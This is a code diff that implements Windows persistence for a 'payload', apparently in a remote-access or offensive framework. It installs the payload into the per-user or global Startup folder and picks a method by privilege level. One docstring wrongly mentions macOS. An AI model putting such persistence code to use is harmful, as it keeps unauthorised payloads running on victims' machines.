@@ -3,6 +3,7 @@ windows.py: Windows-specific persistence logic.
 """
 
 from .base import Persistence
+from .windows_utilities import startup
 from .windows_utilities.persistence_methods import WindowsPersistenceMethods
 
 
@@ -27,19 +28,39 @@ class WindowsPersistence(Persistence):
 
 
     def _determine_recommended_persistence_method(self) -> str:
-        # TODO: Remove this line when the method is implemented.
-        return super()._determine_recommended_persistence_method()
+        """
+        Determine the recommended persistence method for Windows.
+        """
+        if self.identifier == 0:
+            return WindowsPersistenceMethods.STARTUP_CURRENT_USER.value
+
+        return WindowsPersistenceMethods.STARTUP_GLOBAL.value
 
 
     def supported_persistence_methods(self) -> list:
+        """
+        Get a list of supported persistence methods for macOS.
+        """
         methods = [method.value for method in WindowsPersistenceMethods]
 
         if self.identifier == 0:
             methods.remove(WindowsPersistenceMethods.REGEDIT_RUN.value)
+            methods.remove(WindowsPersistenceMethods.STARTUP_GLOBAL.value)
 
         return methods
 
 
     def install(self) -> None:
-        # TODO: Remove this line when the method is implemented.
-        super().install()
+        """
+        Install payload.
+        """
+        method = self.configured_persistence_method()
+
+        if method == WindowsPersistenceMethods.STARTUP_CURRENT_USER.value:
+            startup.StartupFolder(payload=self.payload).install_current_user()
+            return
+        if method == WindowsPersistenceMethods.STARTUP_GLOBAL.value:
+            startup.StartupFolder(payload=self.payload).install_global()
+            return
+
+        raise NotImplementedError(f"Method {method} not implemented.")
